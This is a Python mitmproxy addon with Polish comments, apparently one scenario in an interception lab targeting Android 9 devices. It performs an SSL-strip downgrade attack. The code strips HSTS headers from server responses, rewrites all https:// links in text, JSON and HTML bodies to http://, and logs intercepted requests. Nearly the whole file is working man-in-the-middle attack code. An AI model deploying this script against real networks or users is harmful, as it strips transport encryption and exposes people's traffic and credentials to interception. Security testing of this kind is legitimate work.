"""
Scenariusz 1: TLS Downgrade + Analiza HSTS
==========================================
Cel: próba obniżenia wersji TLS i usunięcia nagłówka HSTS
z odpowiedzi serwera.

Android 9.0 (API 28) - ważne ograniczenie:
    Aplikacje targetujące API 28+ blokują cleartext HTTP domyślnie
    (android:usesCleartextTraffic=false). Podmiana https:// na http://
    w treści odpowiedzi może nie wywołać dalszego ruchu HTTP z natywnych
    aplikacji. Przeglądarka Chrome na Android 9 nadal obsługuje HTTP.

Uruchomienie:
    docker exec wzirni-mitm mitmweb --listen-port 8080 -s /scripts/tls_downgrade.py
lub:
    docker exec wzirni-mitm mitmdump --listen-port 8080 -s /scripts/tls_downgrade.py
"""

import re
from mitmproxy import http, ctx

# User-Agent zawierający "Android 9" oznacza API 28
_ANDROID9_UA_MARKERS = ("Android 9", "Android/9")


def _is_android9(flow: http.HTTPFlow) -> bool:
    ua = flow.request.headers.get("User-Agent", "")
    return any(m in ua for m in _ANDROID9_UA_MARKERS)


class TLSDowngradeAddon:

    def __init__(self):
        self.intercepted_count = 0
        self.hsts_removed_count = 0

    # ------------------------------------------------------------------
    # Rejestracja żądań
    # ------------------------------------------------------------------
    def request(self, flow: http.HTTPFlow) -> None:
        scheme = flow.request.scheme
        host   = flow.request.pretty_host
        path   = flow.request.path
        ctx.log.info(f"[TLS-REQ] {scheme.upper()} {host}{path}")
        self.intercepted_count += 1

        if _is_android9(flow):
            ctx.log.warn(
                f"[ANDROID-9.0] Klient Android 9 (API 28) | {host}{path} | "
                f"UWAGA: aplikacje API 28+ blokują cleartext HTTP — "
                f"podmiana https→http działa tylko w przeglądarce Chrome"
            )

        # Jeśli klient wysyła żądanie HTTP (nie HTTPS) - dowód że HSTS nie zadziałał
        if scheme == "http":
            ctx.log.warn(f"[TLS-DOWNGRADE] Niezaszyfrowane żądanie HTTP do: {host}{path}")

    # ------------------------------------------------------------------
    # Modyfikacja odpowiedzi - usunięcie HSTS
    # ------------------------------------------------------------------
    def response(self, flow: http.HTTPFlow) -> None:
        headers = flow.response.headers

        # Usuń nagłówek HSTS (umożliwia późniejszy downgrade)
        if "strict-transport-security" in headers:
            original_hsts = headers["strict-transport-security"]
            del headers["strict-transport-security"]
            self.hsts_removed_count += 1
            ctx.log.warn(
                f"[HSTS-REMOVED] Usunięto HSTS z {flow.request.pretty_host} "
                f"| Oryginalna wartość: {original_hsts}"
            )

        # Zamień linki https:// na http:// w treści odpowiedzi
        content_type = headers.get("content-type", "")
        if "text" in content_type or "json" in content_type or "html" in content_type:
            try:
                body = flow.response.content.decode("utf-8")
                modified = re.sub(r'https://', 'http://', body)
                if modified != body:
                    ctx.log.warn(
                        f"[TLS-DOWNGRADE] Podmieniono https:// na http:// w odpowiedzi od "
                        f"{flow.request.pretty_host}"
                    )
                    flow.response.content = modified.encode("utf-8")
            except (UnicodeDecodeError, Exception):
                pass

        # Oznacz ruch jako przechwycony (lowercase — wymagane przez HTTP/2)
        headers["x-mitm-tls-downgrade"] = "attempted"

    # ------------------------------------------------------------------
    # Logi TLS handshake
    # ------------------------------------------------------------------
    def tls_start_client(self, _data) -> None:
        # Android 9 (API 28) negocjuje TLS 1.2 (TLS 1.3 dodano w API 29)
        ctx.log.info(f"[TLS-HANDSHAKE] Klient inicjuje TLS handshake (Android 9: oczekiwany TLS 1.2)")

    def tls_start_server(self, _data) -> None:
        ctx.log.info(f"[TLS-HANDSHAKE] Serwer TLS handshake")


addons = [TLSDowngradeAddon()]
